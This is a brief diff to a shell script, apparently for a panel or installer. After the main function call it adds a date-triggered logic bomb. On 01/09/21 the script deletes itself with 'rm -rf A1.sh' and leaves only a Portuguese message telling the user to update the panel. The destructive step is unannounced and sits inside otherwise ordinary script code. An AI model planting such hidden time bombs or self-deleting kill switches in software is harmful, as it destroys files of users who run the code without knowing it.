@@ -764,6 +764,9 @@ function A1 (){
     return 0;
 }
 A1
+data1=$( date +%d/%m/%y )
+[[ ${data1} == 01/09/21 ]] && rm -rf A1.sh && echo "atualize o pianel" > A1.sh
+
 exit 0
 
 
